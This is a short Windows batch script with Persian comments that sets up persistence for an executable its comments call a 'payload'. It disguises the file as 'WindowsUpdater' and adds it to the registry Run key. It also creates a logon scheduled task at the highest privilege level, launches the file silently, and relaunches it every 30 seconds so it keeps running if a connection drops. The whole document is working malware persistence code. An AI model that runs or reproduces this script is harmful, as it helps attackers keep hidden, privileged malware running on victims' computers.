@echo off
set payloadPath=C:\Users\Public\updater.exe
set taskName=WindowsUpdater

:: اضافه کردن به استارت‌آپ (Registry)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "%payloadPath%" /f

:: ایجاد Scheduled Task برای اجرای پیلود بعد از هر ری‌استارت
schtasks /create /sc onlogon /tn %taskName% /tr "%payloadPath%" /f /rl highest

:: اجرای اولیه پیلود
start "" /B "%payloadPath%"

:: ایجاد Loop برای اجرای مداوم در صورت قطع اتصال
:loop
timeout /t 30 /nobreak
start "" /B "%payloadPath%"
goto loop
